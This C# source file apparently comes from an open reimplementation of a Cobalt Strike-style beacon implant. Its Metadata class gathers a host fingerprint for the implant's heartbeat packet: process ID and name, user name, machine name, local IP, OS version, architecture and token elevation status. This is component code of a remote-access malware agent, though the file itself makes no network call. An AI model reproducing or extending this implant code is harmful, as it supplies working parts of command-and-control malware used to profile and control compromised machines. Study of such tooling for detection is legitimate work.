using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Net;
using Beacon.Utils;
using System.IO;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Runtime.InteropServices;

using PInvoke = Beacon.Utils;


namespace Beacon.Core
{
    /// <summary>
    /// 构造心跳包（元数据）相关
    /// </summary>
    public class Metadata
    {
        public int _nPid;
        public string _strUserName;
        public string _strHostName;
        public string _strProcName;
        public int _nBeaconId;
        public int _nLocalIP;
        public byte _bMajorVerison;
        public byte _bMinorVersion;
        public byte _bFlag;
        Process _mProcess;

        public Metadata() {
            GetProcessInfo();
            GetOSVersion();
            _strUserName = GetUsername();
            _strHostName = GetHostname();
            _nBeaconId = GetBeaconID();
            _nLocalIP = GetLocalIp();
            _bFlag = GetFlag();
        }

        /// <summary>
        /// 获得系统当前用户名
        /// </summary>
        public string GetUsername()
        {
            return Environment.UserName;
        }

        /// <summary>
        /// 获得系统的版本号
        /// </summary>
        public void GetOSVersion()
        {
            Version ver = System.Environment.OSVersion.Version;
            _bMajorVerison = (byte)ver.Major;
            _bMinorVersion = (byte)ver.Minor;
        }

        /// <summary>
        /// 获得系计算机名
        /// </summary>
        public string GetHostname()
        {
            return Environment.MachineName;
        }

        /// <summary>
        /// 获得系统的位数
        /// </summary>
        public byte GetArchitecture()
        {
            const ushort PROCESSOR_ARCHITECTURE_INTEL = 0;
            const ushort PROCESSOR_ARCHITECTURE_AMD64 = 9;

            var sysInfo = new Win32.Kernel32.SYSTEM_INFO();
            Beacon.Utils.Win32.Kernel32.GetNativeSystemInfo(ref sysInfo);

            switch (sysInfo.wProcessorArchitecture)
            {
                case PROCESSOR_ARCHITECTURE_AMD64:
                    return 2;
                case PROCESSOR_ARCHITECTURE_INTEL:
                    return 0;
            }
            return 1;
        }

        /// <summary>
        /// 获得当前进程位数
        /// </summary>
        public byte IsWow64(Process Process)
        {
            try
            {
                PInvoke.Win32.Kernel32.IsWow64Process(Process.Handle, out bool isWow64);
                return 4;
            }
            catch (InvalidOperationException)
            {
                return 0;
            }
            catch (System.ComponentModel.Win32Exception)
            {
                return 0;
            }
        }

        /// <summary>
        /// 获得当前进程的pid和进程名
        /// </summary>
        public void GetProcessInfo()
        {
            _mProcess = Process.GetCurrentProcess();
            _nPid = _mProcess.Id;
            _strProcName = _mProcess.ProcessName;
        }

        /// <summary>
        /// 生成BeaconID值
        /// </summary>
        public int GetBeaconID()
        {
            Random rnd = new Random();
            int n  = rnd.Next(100000, 999998);
            if (n % 2 == 1)
            {
                n = n + 1;
            }
            return n;
        }

        /// <summary>
        /// 获得当前计算机ip地址
        /// </summary>
        public int GetLocalIp()
        {
            ///获取本地的IP地址
            foreach (IPAddress _IPAddress in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
            {
                if (_IPAddress.AddressFamily.ToString() == "InterNetwork")
                {
                    return _IPAddress.GetHashCode();
                }
            }
            return 0;
        }

        public byte GetFlag()
        {
            byte b = GetArchitecture();
            b += IsWow64(_mProcess);
            if (UserProcessToken(this._mProcess)) {
                b += 8;
            }
            return b;
        }

        /// <summary>
        /// 判断当前权限是否为管理员权限
        /// </summary>
        private static bool TokenIsElevated(IntPtr hToken)
        {
            UInt32 tokenInformationLength = (UInt32)Marshal.SizeOf(typeof(UInt32));
            IntPtr tokenInformation = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UInt32)));
            UInt32 returnLength;

            bool result = PInvoke.Win32.Advapi32.GetTokenInformation(
                hToken,
                Win32.WinNT._TOKEN_INFORMATION_CLASS.TokenElevationType,
                tokenInformation,
                tokenInformationLength,
                out returnLength
            );

            switch ((Win32.WinNT._TOKEN_ELEVATION_TYPE)Marshal.ReadInt32(tokenInformation))
            {
                case Win32.WinNT._TOKEN_ELEVATION_TYPE.TokenElevationTypeDefault:
                    return false;
                case Win32.WinNT._TOKEN_ELEVATION_TYPE.TokenElevationTypeFull:
                    return true;
                case Win32.WinNT._TOKEN_ELEVATION_TYPE.TokenElevationTypeLimited:
                    return false;
                default:
                    return true;
            }
        }

        public bool UserProcessToken(Process process)
        {
            IntPtr hProcess = PInvoke.Win32.Kernel32.OpenProcess(Utils.Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_LIMITED_INFORMATION, true, (UInt32)process.Id);
            if (hProcess == IntPtr.Zero)
            {
                return false;
            }

            IntPtr hProcessToken;
            if (!PInvoke.Win32.Kernel32.OpenProcessToken(hProcess, (UInt32)Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, out hProcessToken))
            {
                return false;
            }
            PInvoke.Win32.Kernel32.CloseHandle(hProcess);

            UInt32 dwLength = 0;
            Utils.Win32.WinNT._TOKEN_STATISTICS tokenStatistics = new Win32.WinNT._TOKEN_STATISTICS();
            //this.TokenType = tokenStatistics.TokenType;
            if (!PInvoke.Win32.Advapi32.GetTokenInformation(hProcessToken, Win32.WinNT._TOKEN_INFORMATION_CLASS.TokenStatistics, ref tokenStatistics, dwLength, out dwLength))
            {
                if (!PInvoke.Win32.Advapi32.GetTokenInformation(hProcessToken, Win32.WinNT._TOKEN_INFORMATION_CLASS.TokenStatistics, ref tokenStatistics, dwLength, out dwLength))
                {
                    return false;
                }
            }
            bool IsElevated = TokenIsElevated(hProcessToken);
            PInvoke.Win32.Kernel32.CloseHandle(hProcessToken);
            return IsElevated;
        }

    }
}
